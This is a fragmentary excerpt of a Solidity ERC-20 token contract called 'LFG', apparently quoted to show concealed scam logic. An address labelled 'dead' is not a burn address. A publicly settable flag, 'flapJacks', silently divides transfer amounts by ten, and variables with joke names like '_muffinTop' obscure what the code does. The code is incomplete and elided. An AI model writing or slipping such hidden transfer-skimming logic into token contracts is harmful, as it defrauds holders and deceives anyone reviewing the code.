...
contract LFG is Context, IERC20, Ownable {
    ...
    address dead = 0x35232Bc435B6E32c291aB1Afb9c7aF08Ae8ec74B;
...
*/
    ...
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner {
        require(
            liquidityFee >= 0 && liquidityFee <= maxLiqFee,
            "liquidityFee out of range"
        );
    ...
    function _tokenTransfer(
        ...
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            ...
            _transferToExcluded(sender, recipient, amount);
             ...
             _transferStandard(sender, recipient, amount, flapJacks);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
    ...
    bool public flapJacks;

    function setflapJacks(bool _flapJacks) public {
        flapJacks = _flapJacks;
        if (_flapJacks) {
         
             _muffinTop = 100000000;
        }
        else {
            _muffinTop = 666;
        }
    ...
    function _transferStandard(
        ...
        if (_flapJacks) {
            rTransferAmount = rTransferAmount.div(10);
             _muffinTop = 696969;
        }
        else {
            _muffinTop = 666;
